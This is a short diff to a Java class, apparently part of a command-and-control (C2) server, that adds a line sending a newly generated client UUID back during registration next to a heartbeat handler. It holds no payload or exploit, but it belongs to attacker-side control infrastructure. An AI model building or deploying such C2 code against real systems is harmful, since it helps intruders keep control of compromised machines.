@@ -57,6 +57,7 @@ public class C2ClientThread extends Thread {
                             this.uuid = UUID.randomUUID();
                             boolean bool = commandDatabase.insertIntoDatabase(uuid.toString(), "", "");
                             Log.e("New UUID", uuid.toString());
+                            out.println(uuid.toString());
                             break;
                         case "heartbeat":
                             //str should be heartbeat
